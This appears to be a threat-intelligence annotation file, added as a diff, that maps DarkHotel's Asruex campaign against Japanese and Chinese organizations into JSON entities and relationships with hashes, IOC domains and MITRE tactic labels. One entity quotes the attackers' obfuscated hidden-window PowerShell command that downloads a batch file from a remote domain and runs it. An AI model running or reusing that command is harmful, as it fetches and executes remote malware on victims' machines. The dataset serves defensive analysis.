@@ -1,0 +1,257 @@
+{
+    "Entities": [
+        {
+            "EntityId": "entity_1",
+            "EntityName": "DarkHotel",
+            "EntityVariantNames": [
+                "Dubnium"
+            ],
+            "EntityType": "attcker",
+            "EntitySubType": "org",
+            "Labels": [
+                "TA0001",
+                "TA0002",
+                "TA0011"
+            ],
+            "Times": [
+                "1"
+            ]
+        },
+        {
+            "EntityId": "entity_2",
+            "EntityName": "Asruex Malware Attack Event",
+            "EntityType": "event",
+            "EntitySubType": "event",
+            "Labels": [
+                "TA0001",
+                "TA0002",
+                "TA0011"
+            ],
+            "Times": [
+                "1"
+            ],
+            "Properties": {
+                "time": "October 2015",
+                "observe_time": "2016",
+                "report_name": "2016_JPCERT_AsruexShortcutFiles(06-30-2016)_f9b46acd"
+            }
+        },
+        {
+            "EntityId": "entity_3",
+            "EntityName": "Japanese and Chinese Organizations",
+            "EntityType": "vctim",
+            "EntitySubType": "org",
+            "Labels": [
+                "TA0001"
+            ],
+            "Times": [
+                "1"
+            ]
+        },
+        {
+            "EntityId": "entity_4",
+            "EntityName": "Malicious Shortcut File",
+            "EntityType": "file",
+            "EntitySubType": "file",
+            "Labels": [
+                "TA0001"
+            ],
+            "Times": [
+                "2"
+            ],
+            "Properties": {
+                "hash": "c60a93a712d0716a04dc656a0d1ba06be5047794deaa9769a2de5d0fcf843c2a",
+                "type": "Shortcut"
+            }
+        },
+        {
+            "EntityId": "entity_5",
+            "EntityName": "PowerShell Command",
+            "EntityType": "tool",
+            "EntitySubType": "shell",
+            "Labels": [
+                "TA0002"
+            ],
+            "Times": [
+                "3"
+            ],
+            "Properties": {
+                "command": "powershell -windowstyle hidden $c='(new-object System.Net.WebClient).D'+'ownloadFile(\"\"\"http://online-dropbox.com/online/a\"\"\", \"\"\"$env:tmp\\gst.bat\"\"\")';Invoke-Expression $c&%tmp%\\gst.bat \"%CD%\""
+            }
+        },
+        {
+            "EntityId": "entity_6",
+            "EntityName": "online-dropbox.com",
+            "EntityType": "ioc",
+            "EntitySubType": "url",
+            "Labels": [
+                "TA0011"
+            ],
+            "Times": [
+                "3"
+            ]
+        },
+        {
+            "EntityId": "entity_7",
+            "EntityName": "Downloader",
+            "EntityType": "tool",
+            "EntitySubType": "malware",
+            "Labels": [
+                "TA0002"
+            ],
+            "Times": [
+                "4"
+            ],
+            "Properties": {
+                "hash": "fdf3b42ac9fdbcabc152b200ebaae0a8275123111f25d4a68759f8b899e5bdd6"
+            }
+        },
+        {
+            "EntityId": "entity_8",
+            "EntityName": "Asruex",
+            "EntityType": "tool",
+            "EntitySubType": "malware",
+            "Labels": [
+                "TA0002",
+                "TA0011"
+            ],
+            "Times": [
+                "5"
+            ],
+            "Properties": {
+                "hash": "8af41d303db8a975759f7b35a236eb3e9b4bd2ef65b070d19bd1076ea96fa5c4"
+            }
+        },
+        {
+            "EntityId": "entity_9",
+            "EntityName": "Windows System",
+            "EntityType": "env",
+            "EntitySubType": "os",
+            "Labels": [
+                "TA0002"
+            ],
+            "Times": [
+                "2"
+            ]
+        },
+        {
+            "EntityId": "entity_10",
+            "EntityName": "Process Hacker",
+            "EntityType": "tool",
+            "EntitySubType": "tool",
+            "Labels": [
+                "TA0005"
+            ],
+            "Times": [
+                "4"
+            ]
+        },
+        {
+            "EntityId": "entity_11",
+            "EntityName": "AdvProv.dll",
+            "EntityType": "file",
+            "EntitySubType": "file",
+            "Labels": [
+                "TA0002"
+            ],
+            "Times": [
+                "6"
+            ],
+            "Properties": {
+                "hash": "f06000dceb4342630bf9195c2475fcd822dfe3910b0fa21691878071d0bb10fc"
+            }
+        },
+        {
+            "EntityId": "entity_12",
+            "EntityName": "vodsx.net",
+            "EntityType": "ioc",
+            "EntitySubType": "domain",
+            "Labels": [
+                "TA0011"
+            ],
+            "Times": [
+                "5"
+            ]
+        }
+    ],
+    "Relationships": [
+        {
+            "RelationshipId": "relationship_1",
+            "RelationshipType": "involve",
+            "Source": "Asruex Malware Attack Event",
+            "Target": "DarkHotel"
+        },
+        {
+            "RelationshipId": "relationship_2",
+            "RelationshipType": "involve",
+            "Source": "Asruex Malware Attack Event",
+            "Target": "Japanese and Chinese Organizations"
+        },
+        {
+            "RelationshipId": "relationship_3",
+            "RelationshipType": "use",
+            "Source": "DarkHotel",
+            "Target": "Malicious Shortcut File"
+        },
+        {
+            "RelationshipId": "relationship_4",
+            "RelationshipType": "use",
+            "Source": "DarkHotel",
+            "Target": "PowerShell Command"
+        },
+        {
+            "RelationshipId": "relationship_5",
+            "RelationshipType": "use",
+            "Source": "DarkHotel",
+            "Target": "Asruex"
+        },
+        {
+            "RelationshipId": "relationship_6",
+            "RelationshipType": "target",
+            "Source": "DarkHotel",
+            "Target": "Japanese and Chinese Organizations"
+        },
+        {
+            "RelationshipId": "relationship_7",
+            "RelationshipType": "related_to",
+            "Source": "PowerShell Command",
+            "Target": "online-dropbox.com"
+        },
+        {
+            "RelationshipId": "relationship_8",
+            "RelationshipType": "related_to",
+            "Source": "Asruex",
+            "Target": "vodsx.net"
+        },
+        {
+            "RelationshipId": "relationship_9",
+            "RelationshipType": "related_to",
+            "Source": "Downloader",
+            "Target": "Asruex"
+        },
+        {
+            "RelationshipId": "relationship_10",
+            "RelationshipType": "related_to",
+            "Source": "Asruex",
+            "Target": "AdvProv.dll"
+        },
+        {
+            "RelationshipId": "relationship_11",
+            "RelationshipType": "trigger",
+            "Source": "Japanese and Chinese Organizations",
+            "Target": "Malicious Shortcut File"
+        },
+        {
+            "RelationshipId": "relationship_12",
+            "RelationshipType": "has",
+            "Source": "Japanese and Chinese Organizations",
+            "Target": "Windows System"
+        },
+        {
+            "RelationshipId": "relationship_13",
+            "RelationshipType": "affect",
+            "Source": "Malicious Shortcut File",
+            "Target": "Windows System"
+        }
+    ]
+}
